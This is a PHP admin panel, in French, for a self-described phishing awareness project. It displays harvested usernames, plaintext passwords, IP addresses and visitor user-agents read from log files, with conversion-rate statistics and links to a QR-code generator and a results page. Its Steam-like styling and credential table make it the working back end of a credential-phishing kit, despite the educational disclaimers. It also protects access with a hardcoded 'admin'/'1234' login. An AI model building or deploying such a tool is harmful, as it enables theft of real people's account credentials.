<?php
// Page d'administration pour le projet de sensibilisation au phishing
// Cette page est protégée par mot de passe pour éviter une utilisation non autorisée

// Paramètres de connexion (à changer en production)
$username = "admin";
$password = "1234";

// Vérifier si l'utilisateur est connecté
session_start();
$loggedIn = false;

if (isset($_POST['login'])) {
    if ($_POST['username'] == $username && $_POST['password'] == $password) {
        $_SESSION['admin'] = true;
        $loggedIn = true;
    } else {
        $error = "Identifiants incorrects";
    }
} elseif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {
    $loggedIn = true;
}

// Purger les données si demandé
if ($loggedIn && isset($_POST['purge'])) {
    if (file_exists('info_phishing.txt')) {
        file_put_contents('info_phishing.txt', '');
    }
    if (file_exists('ip.txt')) {
        file_put_contents('ip.txt', '');
    }
    $success = "Les données ont été purgées avec succès.";
}

// Préparer les statistiques
$stats = [];
if ($loggedIn) {
    // Nombre total de visites
    $visits = 0;
    if (file_exists('ip.txt')) {
        $ipLines = file('ip.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        $visits = count($ipLines);
    }
    
    // Nombre de tentatives de connexion (nouveau format)
    $logins = 0;
    if (file_exists('info_phishing.txt')) {
        $content = file_get_contents('info_phishing.txt');
        preg_match_all('/========= Connexion détectée =========/', $content, $matches);
        $logins = count($matches[0]);
    }
    
    // Taux de conversion (proportion de visiteurs qui ont tenté de se connecter)
    $conversionRate = ($visits > 0) ? round(($logins / $visits) * 100, 2) : 0;
    
    $stats = [
        'visits' => $visits,
        'logins' => $logins,
        'conversionRate' => $conversionRate
    ];
}

// Fonction pour extraire les informations du fichier info_phishing.txt
function getPhishingEntries($limit = 10) {
    $entries = [];
    
    if (!file_exists('info_phishing.txt') || filesize('info_phishing.txt') == 0) {
        return $entries;
    }
    
    $content = file_get_contents('info_phishing.txt');
    $lines = explode("\n", $content);
    
    $currentEntry = [];
    foreach ($lines as $line) {
        if (strpos($line, '========= Connexion détectée =========') !== false) {
            if (!empty($currentEntry)) {
                $entries[] = $currentEntry;
            }
            $currentEntry = [];
        } elseif (strpos($line, '🕒 Date') !== false) {
            $currentEntry['date'] = trim(str_replace('🕒 Date        :', '', $line));
        } elseif (strpos($line, '👤 Identifiant') !== false) {
            $currentEntry['username'] = trim(str_replace('👤 Identifiant :', '', $line));
        } elseif (strpos($line, '🔐 Mot de passe') !== false) {
            $currentEntry['password'] = trim(str_replace('🔐 Mot de passe:', '', $line));
        } elseif (strpos($line, '🌍 IP') !== false) {
            $currentEntry['ip'] = trim(str_replace('🌍 IP          :', '', $line));
        }
    }
    
    if (!empty($currentEntry)) {
        $entries[] = $currentEntry;
    }
    
    // Prendre les dernières entrées selon la limite
    $entries = array_slice($entries, -$limit);
    
    return $entries;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Administration - Projet de Sensibilisation</title>
    <style>
        body {
            background-color: #181a21;
            color: #e9e9e9;
            font-family: "Motiva Sans", Sans-serif;
            margin: 0;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #1b2838;
            padding: 30px;
            border-radius: 4px;
            box-shadow: 0 0 20px rgba(0,0,0,0.3);
        }
        h1, h2 {
            color: #fff;
        }
        h1 {
            border-bottom: 1px solid #417a9b;
            padding-bottom: 10px;
            margin-top: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #afafaf;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border-radius: 2px;
            background-color: #32353c;
            border: 1px solid #32353c;
            color: #fff;
            font-size: 15px;
        }
        input[type="text"]:hover, input[type="password"]:hover {
            background-color: #393c44;
        }
        .button {
            display: inline-block;
            background: linear-gradient(90deg, #06bfff 0, #2d73ff 100%);
            color: white;
            padding: 12px 24px;
            text-decoration: none;
            border-radius: 2px;
            font-weight: bold;
            border: none;
            cursor: pointer;
            margin-right: 10px;
        }
        .button:hover {
            background: linear-gradient(90deg, #06bfff 30%, #2d73ff 100%);
        }
        .button.danger {
            background: linear-gradient(90deg, #d94126 0, #c15755 100%);
        }
        .button.danger:hover {
            background: linear-gradient(90deg, #ee563b 0, #d94126 100%);
        }
        .warning {
            background-color: rgba(217, 65, 38, 0.2);
            border-left: 4px solid #d94126;
            padding: 15px;
            margin: 20px 0;
        }
        .info {
            background-color: rgba(26, 159, 255, 0.1);
            border-left: 4px solid #1a9fff;
            padding: 15px;
            margin: 20px 0;
        }
        .success {
            background-color: rgba(90, 163, 43, 0.2);
            border-left: 4px solid #5ba32b;
            padding: 15px;
            margin: 20px 0;
        }
        .error {
            color: #c15755;
            margin-bottom: 15px;
        }
        .stats-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-box {
            flex: 1;
            min-width: 200px;
            background-color: #32353c;
            padding: 20px;
            border-radius: 4px;
            text-align: center;
        }
        .stat-value {
            font-size: 36px;
            font-weight: bold;
            color: #1999ff;
            margin: 10px 0;
        }
        .stat-label {
            color: #afafaf;
            font-size: 14px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #32353c;
        }
        th {
            background-color: #32353c;
            color: #fff;
        }
        .actions {
            margin-top: 30px;
            display: flex;
            gap: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Administration - Projet de Sensibilisation</h1>
        
        <?php if (!$loggedIn): ?>
            <?php if (isset($error)): ?>
                <div class="error"><?php echo $error; ?></div>
            <?php endif; ?>
            
            <div class="info">
                <p>Cette page est réservée aux administrateurs du projet. Veuillez vous connecter pour accéder aux statistiques.</p>
            </div>
            
            <form method="post">
                <div class="form-group">
                    <label for="username">Nom d'utilisateur:</label>
                    <input type="text" id="username" name="username" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Mot de passe:</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <button type="submit" name="login" class="button">Se connecter</button>
            </form>
        <?php else: ?>
            <?php if (isset($success)): ?>
                <div class="success">
                    <p><?php echo $success; ?></p>
                </div>
            <?php endif; ?>
            
            <div class="warning">
                <p><strong>Rappel:</strong> Ces données sont sensibles et doivent être utilisées uniquement à des fins éducatives et de recherche.</p>
            </div>
            
            <h2>Statistiques du projet</h2>
            
            <div class="stats-container">
                <div class="stat-box">
                    <div class="stat-label">Nombre de visites</div>
                    <div class="stat-value"><?php echo $stats['visits']; ?></div>
                </div>
                
                <div class="stat-box">
                    <div class="stat-label">Tentatives de connexion</div>
                    <div class="stat-value"><?php echo $stats['logins']; ?></div>
                </div>
                
                <div class="stat-box">
                    <div class="stat-label">Taux de conversion</div>
                    <div class="stat-value"><?php echo $stats['conversionRate']; ?>%</div>
                </div>
            </div>
            
            <h2>Dernières tentatives de connexion</h2>
            
            <?php 
            $phishingEntries = getPhishingEntries(10);
            if (!empty($phishingEntries)): 
            ?>
                <table>
                    <thead>
                        <tr>
                            <th>Date</th>
                            <th>Nom d'utilisateur</th>
                            <th>Mot de passe</th>
                            <th>IP</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($phishingEntries as $entry): ?>
                        <tr>
                            <td><?php echo htmlspecialchars($entry['date'] ?? 'N/A'); ?></td>
                            <td><?php echo htmlspecialchars($entry['username'] ?? 'N/A'); ?></td>
                            <td><?php echo htmlspecialchars($entry['password'] ?? 'N/A'); ?></td>
                            <td><?php echo htmlspecialchars($entry['ip'] ?? 'N/A'); ?></td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php else: ?>
                <p>Aucune tentative de connexion enregistrée.</p>
            <?php endif; ?>
            
            <h2>Dernières visites</h2>
            
            <?php if (file_exists('ip.txt') && filesize('ip.txt') > 0): ?>
                <table>
                    <thead>
                        <tr>
                            <th>IP</th>
                            <th>Date</th>
                            <th>User-Agent</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $ipLines = file('ip.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                        $ipLines = array_slice($ipLines, -10); // Afficher les 10 dernières entrées
                        
                        foreach ($ipLines as $line) {
                            if (preg_match('/IP: (.*) \| Date: (.*) \| User-Agent: (.*)/', $line, $matches) && count($matches) >= 4) {
                                echo "<tr>
                                    <td>" . htmlspecialchars($matches[1]) . "</td>
                                    <td>" . htmlspecialchars($matches[2]) . "</td>
                                    <td>" . htmlspecialchars($matches[3]) . "</td>
                                </tr>";
                            }
                        }
                        ?>
                    </tbody>
                </table>
            <?php else: ?>
                <p>Aucune visite enregistrée.</p>
            <?php endif; ?>
            
            <div class="actions">
                <a href="generate_qr.php" class="button">Générer un QR Code</a>
                
                <a href="phishing_results.php" class="button">Voir les données de phishing</a>
                
                <form method="post" onsubmit="return confirm('Êtes-vous sûr de vouloir purger toutes les données? Cette action est irréversible.');">
                    <button type="submit" name="purge" class="button danger">Purger les données</button>
                </form>
            </div>
            
            <div class="info">
                <p>Rappel: Dans le cadre de ce projet éducatif, il est essentiel de:</p>
                <ul>
                    <li>Informer les participants de la nature éducative de l'exercice après leur participation</li>
                    <li>Supprimer les données après l'analyse pour des raisons de confidentialité</li>
                    <li>Utiliser les résultats uniquement pour améliorer la sensibilisation à la sécurité</li>
                </ul>
            </div>
        <?php endif; ?>
    </div>
</body>
</html> 
